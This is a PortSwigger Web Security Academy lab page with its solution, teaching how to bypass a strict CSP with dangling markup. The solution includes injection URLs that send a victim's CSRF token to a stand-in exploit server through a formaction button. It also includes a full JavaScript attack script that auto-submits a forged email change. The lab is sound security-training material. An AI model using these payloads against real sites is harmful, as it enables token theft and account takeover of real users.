# Lab: Reflected XSS protected by very strict CSP, with dangling markup attack

Source: https://portswigger.net/web-security/cross-site-scripting/content-security-policy/lab-very-strict-csp-with-dangling-markup-attack
Fetched: 2026-06-28T09:17:44.678810+00:00

Web Security Academy

Cross-site scripting

CSP

Lab

Lab: Reflected XSS protected by very strict CSP, with dangling markup attack

This lab uses a strict CSP that prevents the browser from loading subresources from external domains.

To solve the lab, perform a form hijacking attack that bypasses the CSP, exfiltrates the simulated victim user's CSRF token, and uses it to authorize changing the email to hacker@evil-user.net.

You must label your vector with the word "Click" in order to induce the simulated user to click it. For example:

<a href="">Click me</a>

You can log in to your own account using the following credentials: wiener:peter

Note

To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use the provided exploit server.

Hint

You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, make sure you use a different email address for the final exploit you deliver to the victim.

Solution

Log in to the lab using the credentials provided above.

Interact with the change email function. Notice that the injection of common XSS attack payloads, such as <img src onerror=alert(1)>, is blocked by client-side validation.

Use the browser DevTools to inspect the email input element. Notice that:

You can change its type from email to text to bypass the client-side validation.

Within the form there is a hidden input field that includes a CSRF token. This indicates that it is necessary for the email change process.

Change the payload to foo@example.com"><img src= onerror=alert(1)>, embedding it within a valid email format. This makes the input appear legitimate in order to bypass client-side validation.

Submit the payload. Notice that it is reflected on the page but is correctly escaped, meaning it does not execute as a script. This indicates that the server is properly sanitizing the input, and that additional security measures such as CSP may also be in place to block the execution of malicious scripts.

Now that we have identified and bypassed client-side validation, our next step is to test how the server handles and sanitizes reflected inputs and to check for the presence of additional security measures like CSP.

Add a query parameter called email to the end of the page URL and use it to attempt inserting the payload again. For example:

https://YOUR-LAB-ID.web-security-academy.net/my-account?email=<img src onerror=alert(1)>

Load this URL. Notice that your payload is reflected on the page, but the code doesn't run. This is likely because the CSP blocks it.

To confirm this, check the browser DevTools console for any CSP-related messages. You should see a message indicating that the inline script was blocked due to the CSP.

Now that we've confirmed that CSP is blocking our XSS payload, our next step is to try to bypass this protection by checking for weaknesses in the CSP, such as a missing form-action directive.

Go to the exploit server and copy its URL, including /exploit. For example:

https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit

Back in the lab, use the XSS vulnerability in the way the email query parameter is processed to inject a button. For example:

https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button

formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click

me</button>

Make sure that you include the following:

An email query parameter. This is necessary to trigger the XSS vulnerability and inject the button.

An email value in a valid format to ensure the input passes client-side validation. This email value must be closed with a quotation mark to prevent syntax errors and ensure the injected button becomes part of the HTML structure. Without this, the browser might not interpret the HTML correctly, causing the injection to fail.

A button containing a formaction attribute pointing to the copied exploit server's URL. This directs the form submission to the exploit server when the button is clicked.

Load this URL. Notice your injected button appears on the page, and that the Email form is populated with a valid email format.

Click your new button. You are taken to the exploit server. This demonstrates that our attack was able to bypass the site's security and allow redirection of form submissions to an external server.

Notice that the CSRF token is not visible in the URL. This is because the form is submitted via the POST method, which sends data in the body rather than in the URL.

Because the CSRF token is necessary for the email change process, we won't be able to induce the lab to change the user's email without it. Our next step is to capture the CSRF token by adjusting our approach to use the GET method, ensuring the token is included in the URL.

Go back to the lab. Re-inject the button with its formaction attribute. This time, also add the formmethod="get" attribute so that the form is submitted with a GET request. For example:

https://YOUR-LAB-ID.web-security-academy.net/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit"

formmethod="get">Click me</button>

Click your new button. You are taken to the exploit server with the CSRF token now visible in the URL.

We're now ready to begin our attack.

Return to the exploit server and enter the following attack script into the Body field:

<body>

<script>

// Define the URLs for the lab environment and the exploit server.

const academyFrontend = "https://your-lab-url.net/";

const exploitServer = "https://your-exploit-server.net/exploit";

// Extract the CSRF token from the URL.

const url = new URL(location);

const csrf = url.searchParams.get('csrf');

// Check if a CSRF token was found in the URL.

if (csrf) {

// If a CSRF token is present, create dynamic form elements to perform the attack.

const form = document.createElement('form');

const email = document.createElement('input');

const token = document.createElement('input');

// Set the name and value of the CSRF token input to utilize the extracted token for bypassing security measures.

token.name = 'csrf';

token.value = csrf;

// Configure the new email address intended to replace the user's current email.

email.name = 'email';

email.value = 'hacker@evil-user.net';

// Set the form attributes, append the form to the document, and configure it to automatically submit.

form.method = 'post';

form.action = `${academyFrontend}my-account/change-email`;

form.append(email);

form.append(token);

document.documentElement.append(form);

form.submit();

// If no CSRF token is present, redirect the browser to a crafted URL that embeds a clickable button designed to expose or generate a CSRF token by making the user trigger a GET request

} else {

location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`;

}

</script>

</body>

Replace the academyFrontend and exploitServer URLs with the URLs of your lab environment and exploit server respectively.

Click Store, then Deliver exploit to victim. The user's email will be changed to hacker@evil-user.net.

Community solutions

Michael Sommer

Find XSS vulnerabilities using Burp Suite

Try for free
